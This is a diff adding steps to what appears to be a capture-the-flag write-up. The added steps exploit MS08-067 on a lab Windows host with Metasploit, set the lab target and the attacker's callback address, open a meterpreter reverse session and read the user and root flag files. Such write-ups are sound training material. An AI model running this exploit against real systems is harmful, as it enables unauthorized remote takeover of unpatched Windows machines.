@@ -24,3 +24,35 @@ msfconsole
 ```bash
 search ms08-067
 ```
+
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
+```
+
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.17
+```
+
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+```
+
+```bash
+meterpreter > pwd
+```
+
+C:\Documents and Settings\John\Desktop
+
+```bash
+meterpreter > cat user.txt
+```
+
+```bash
+meterpreter > pwd
+```
+
+C:\Documents and Settings\Administrator\Desktop
+
+```bash
+meterpreter > cat root.txt
+```
